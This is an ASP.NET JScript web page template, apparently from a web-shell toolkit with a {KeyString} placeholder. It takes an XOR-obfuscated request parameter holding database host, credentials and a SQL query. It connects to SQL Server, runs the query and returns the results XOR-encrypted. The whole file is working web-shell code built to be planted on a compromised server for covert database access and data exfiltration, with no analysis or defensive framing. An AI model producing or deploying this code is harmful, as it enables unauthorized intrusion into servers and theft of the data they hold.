<%@ Page Language="Jscript"%>
<%
function base64_xor_encrypt(str,key)
{
    var b64byte = System.Text.Encoding.GetEncoding("UTF-8").GetBytes(str);
    var res = new byte[b64byte.length];
    for (var c = 0; c < res.length; c++)
    {
        res[c] = (byte)(b64byte[c] ^ key[c % key.length]);
    }
    return System.Convert.ToBase64String(res);
}

function base64_xor_decrypt(str,key)
{
    var fristBase64_Byte = System.Convert.FromBase64String(str);
    var temp = new byte[fristBase64_Byte.length];
    for (var c = 0; c < temp.length; c++)
    {
        temp[c] = (byte)(fristBase64_Byte[c] ^ key[c % key.length]);
    }
    var secondBase64Sting = Encoding.Default.GetString(temp);
    return secondBase64Sting;
}

try{
    var key = "{KeyString}";
    var args = Request.Item[key];
	if(args == null){
		return;
	}
    var argArr = base64_xor_decrypt(args,key).Split("|");
    var hst = argArr[0];
    var usr = argArr[1];
    var pwd = argArr[2];
    var dbn = argArr[3];
    var sql = System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(argArr[4]));
    var hp = hst.Split(":");
    var DriverUrl = "Driver={Sql Server};Server=" + hp[0] + "," + hp[1] + ";Database=" + dbn + ";Uid=" + usr + ";Pwd=" + pwd;
    var Conn = new ActiveXObject("Adodb.connection");
    Conn.ConnectionString = DriverUrl;
    Conn.ConnectionTimeout = argArr[5];
    Conn.Open();
    var Dat:String = "";
    var Rs = Conn.Execute(sql);
    var i:Int32 = Rs.Fields.Count,c:Int32;
    if (Rs.state != 0){
        while(!Rs.EOF && !Rs.BOF){
            for(c = 0;c<i;c++){
                if(Rs.Fields(c).Value == null){
                    continue;
                }
                Dat += Rs.Fields(c).Value + "\t|\t";
            }
            Dat += "\r\n";
            Rs.MoveNext();
        }
        Response.Write(base64_xor_encrypt(Dat,key));
    } else {
        Response.Write(base64_xor_encrypt("Status | True",key));
    }
	Conn.Close();
}catch(e){
    Response.Write(base64_xor_encrypt("ERROR://" + e.message,key));
}
%>